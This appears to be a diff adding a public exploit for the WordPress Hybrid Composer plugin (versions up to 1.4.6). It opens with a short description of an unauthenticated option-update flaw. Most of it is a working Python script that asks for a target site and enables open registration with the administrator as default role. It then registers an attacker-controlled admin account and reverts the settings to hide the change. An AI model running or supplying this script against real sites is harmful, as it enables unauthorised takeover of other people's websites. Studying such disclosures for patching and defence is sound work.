@@ -1,0 +1,62 @@
+# Exploit Title: Wordpress Hybrid Composer <= 1.4.6 - Unauthenticated Configuration Access (Admin Takeover)
+# Date: 2019-07-24
+# Vendor Homepage: http://wordpress.framework-y.com
+# Software Link:  http://wordpress.framework-y.com/hybrid-composer/
+# Reference: https://labs.sucuri.net/wptf-hybrid-composer-unauthenticated-arbitrary-options-update/, https://wpvulndb.com/vulnerabilities/9452
+# Affected version: <= 1.4.6
+# Researcher: rootetsy
+# Exploit Author: yasin
+# Tested on: Linux
+# Vulnerability discovered by rootetsy
+
+ 
+# Summary
+The plugin Hybrid Composer allows unauthenticated users to update any option in the options database table.
+
+# Description
+A Hybrid Composer plugin enables API routes by registering actions with either wp_ajax_ for authenticated or wp_ajax_nopriv_ for unauthenticated calls. Plugins using wp_ajax_nopriv_ actions should be fine as long as they are not giving access to methods with critical functionalities.
+index.php in the WPTF Hybrid Composer plugin prior 1.4.7 for WordPress has an Unauthenticated Settings Change Vulnerability, related to certain wp_ajax_nopriv_ usage. Anyone can change the plugin's setting by simply sending a request with a hc_ajax_save_option action.
+
+
+# Usage: python exploit.py 
+
+
+
+###########################################################
+import httplib, urllib
+import sys 
+import random
+# pip install httplib urllib random
+
+site = raw_input("[+] Target: ")
+url = "/wp-admin/admin-ajax.php"
+username = "user-%d" % random.randrange(1000000, 3000000)
+email = raw_input("[+] E-mail: ")
+  
+def ChangeOption(site, url, option_name, content):
+    params = urllib.urlencode({'action': 'hc_ajax_save_option', 'option_name': option_name, 'content': content})
+    headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
+    conn = httplib.HTTPSConnection(site) # conn = httplib.HTTPConnection(site)
+    conn.request("POST", url, params, headers)
+    response = conn.getresponse()
+    data = response.read()
+    conn.close()
+registration_url= "/wp-login.php"
+def AdminTakeover(site, registration_url, user_login, user_email):
+    params = urllib.urlencode({'action': 'register', 'user_login': user_login, 'user_email': user_email})
+    headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
+    conn = httplib.HTTPSConnection(site) # conn = httplib.HTTPConnection(site)
+    conn.request("POST", registration_url, params, headers)
+    response = conn.getresponse()
+    data = response.read()
+    conn.close()
+ChangeOption(site, url, "users_can_register", "1")
+ChangeOption(site, url, "default_role", "administrator")      
+print "[+] Registering new admin user"
+AdminTakeover(site, registration_url, username, email)
+print "[+] Check your email for password: " + username + "[" + email + "]"
+ChangeOption(site, url, "users_can_register", "0")
+ChangeOption(site, url, "default_role", "subscriber") 
+
+
+###########################################################
